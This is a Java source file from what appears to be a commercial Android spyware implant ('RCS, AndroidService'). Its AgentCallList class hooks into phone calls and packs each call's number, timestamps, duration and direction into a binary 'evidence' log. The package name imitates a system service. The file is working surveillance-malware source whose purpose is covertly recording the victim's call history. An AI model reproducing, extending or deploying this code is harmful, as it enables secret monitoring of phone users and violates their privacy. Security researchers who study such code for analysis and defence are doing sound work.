/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentCallList.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import com.android.service.Call;
import com.android.service.LogR;
import com.android.service.auto.Cfg;
import com.android.service.evidence.EvidenceType;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.WChar;

public class AgentCallList extends AgentBase implements Observer<Call> {
	private static final String TAG = "AgentCallList";

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub

	}

	@Override
	public void begin() {
		ListenerCall.self().attach(this);

	}

	@Override
	public void end() {
		ListenerCall.self().detach(this);
	}

	Call callInAction;

	public int notification(Call call) {
		final String name = "";
		final boolean missed = false;
		final String nametype = "u";
		final String note = "no notes";

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + call);
		}
		if (call.isOngoing()) {
			// Arrivano due call, in uscita, una con il number, l'altra senza.
			if (call.getNumber().length() > 0) {
				callInAction = call;
			}
			return 0;
		}

		if (Cfg.DEBUG) {
			Check.asserts(callInAction != null, "null callInAction");
		}

		final boolean outgoing = !callInAction.isIncoming();
		final int duration = call.getDuration(callInAction);
		final int LOG_CALLIST_VERSION = 0;

		int len = 28; // 0x1C;

		final String number = callInAction.getNumber();
		len += wsize(number);
		len += wsize(name);
		len += wsize(note);
		len += wsize(nametype);

		final byte[] data = new byte[len];

		final DataBuffer databuffer = new DataBuffer(data, 0, len);

		final DateTime from = new DateTime(callInAction.getTimestamp());
		final DateTime to = new DateTime(call.getTimestamp());

		callInAction = null;

		databuffer.writeInt(len);
		databuffer.writeInt(LOG_CALLIST_VERSION);
		databuffer.writeLong(from.getFiledate());
		databuffer.writeLong(to.getFiledate());

		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
		databuffer.writeInt(flags);

		addTypedString(databuffer, (byte) 0x01, name);
		addTypedString(databuffer, (byte) 0x02, nametype);
		addTypedString(databuffer, (byte) 0x04, note);
		addTypedString(databuffer, (byte) 0x08, number);

		new LogR(EvidenceType.CALLLIST, null, data);

		return 0;
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name, false));
		}
	}
}
